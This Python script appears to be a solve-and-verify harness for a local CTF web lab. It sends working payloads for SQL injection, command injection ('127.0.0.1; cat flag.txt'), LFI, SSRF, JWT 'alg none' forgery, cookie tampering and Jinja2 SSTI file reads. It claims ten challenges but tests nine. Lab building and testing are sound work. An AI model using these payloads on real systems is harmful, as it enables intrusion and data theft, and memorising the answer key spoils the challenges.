#!/usr/bin/env python3
"""
Master Verification Script for 10-Challenge CTF Web Suite
"""
import sys
import re
import base64
import urllib.request
import urllib.parse

BASE_URL = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else "http://localhost:8000"

def test_sqli():
    url = f"{BASE_URL}/sqli/login"
    data = urllib.parse.urlencode({'username': "admin' --", 'password': "x"}).encode()
    req = urllib.request.Request(url, data=data)
    with urllib.request.urlopen(req) as res:
        return bool(re.search(r'CTF\{[A-Za-z0-9_]+\}', res.read().decode()))

def test_comment():
    url = f"{BASE_URL}/hidden_comment/secret_admin_dashboard_99"
    with urllib.request.urlopen(url) as res:
        return bool(re.search(r'CTF\{[A-Za-z0-9_]+\}', res.read().decode()))

def test_cookie():
    url = f"{BASE_URL}/cookie_lab/"
    admin_cookie = base64.b64encode(b"role=admin").decode()
    req = urllib.request.Request(url, headers={'Cookie': f'user_session={admin_cookie}'})
    with urllib.request.urlopen(req) as res:
        return bool(re.search(r'CTF\{[A-Za-z0-9_]+\}', res.read().decode()))

def test_idor():
    url = f"{BASE_URL}/idor/?user_id=100"
    with urllib.request.urlopen(url) as res:
        return bool(re.search(r'CTF\{[A-Za-z0-9_]+\}', res.read().decode()))

def test_lfi():
    url = f"{BASE_URL}/lfi/?page=flag.txt"
    with urllib.request.urlopen(url) as res:
        return bool(re.search(r'CTF\{[A-Za-z0-9_]+\}', res.read().decode()))

def test_rce_ping():
    url = f"{BASE_URL}/rce_ping/"
    data = urllib.parse.urlencode({'ip': '127.0.0.1; cat flag.txt'}).encode()
    req = urllib.request.Request(url, data=data)
    with urllib.request.urlopen(req) as res:
        return bool(re.search(r'CTF\{[A-Za-z0-9_]+\}', res.read().decode()))

def test_ssrf():
    url = f"{BASE_URL}/ssrf/"
    internal_target = f"{BASE_URL}/ssrf/internal/admin/secret"
    data = urllib.parse.urlencode({'url': internal_target}).encode()
    req = urllib.request.Request(url, data=data)
    with urllib.request.urlopen(req) as res:
        return bool(re.search(r'CTF\{[A-Za-z0-9_]+\}', res.read().decode()))

def test_jwt():
    url = f"{BASE_URL}/jwt_lab/"
    header = base64.b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
    payload = base64.b64encode(b'{"user":"admin","role":"admin"}').decode().rstrip('=')
    fake_token = f"{header}.{payload}."
    req = urllib.request.Request(url, headers={'Cookie': f'jwt_auth={fake_token}'})
    with urllib.request.urlopen(req) as res:
        return bool(re.search(r'CTF\{[A-Za-z0-9_]+\}', res.read().decode()))

def test_ssti():
    url = f"{BASE_URL}/ssti/preview"
    payload = "{{ self.__init__.__globals__.__builtins__.open('flag.txt').read() }}"
    data = urllib.parse.urlencode({'template': payload, 'report_name': 'x', 'auditor': 'x', 'status': 'PASSED'}).encode()
    req = urllib.request.Request(url, data=data)
    with urllib.request.urlopen(req) as res:
        return bool(re.search(r'CTF\{[A-Za-z0-9_]+\}', res.read().decode()))

if __name__ == '__main__':
    tests = [
        ("SQLi Auth Bypass", test_sqli),
        ("HTML Comment Leak", test_comment),
        ("Cookie Manipulation", test_cookie),
        ("IDOR Profile View", test_idor),
        ("Local File Inclusion", test_lfi),
        ("Command Injection", test_rce_ping),
        ("SSRF Internal Access", test_ssrf),
        ("JWT Algorithm None", test_jwt),
        ("Jinja2 SSTI WAF Bypass", test_ssti),
    ]
    
    print(f"[*] Testing 10-Challenge CTF Web Suite against {BASE_URL}...\n")
    passed = 0
    for name, test_fn in tests:
        try:
            success = test_fn()
            if success:
                print(f"[+] SUCCESS: {name} -> \033[92mPASSED\033[0m")
                passed += 1
            else:
                print(f"[-] FAILED: {name} -> Flag not found")
        except Exception as e:
            print(f"[-] ERROR: {name} -> {e}")
            
    print(f"\n[=] Final Results: {passed}/{len(tests)} CTF Challenges verified successfully!")
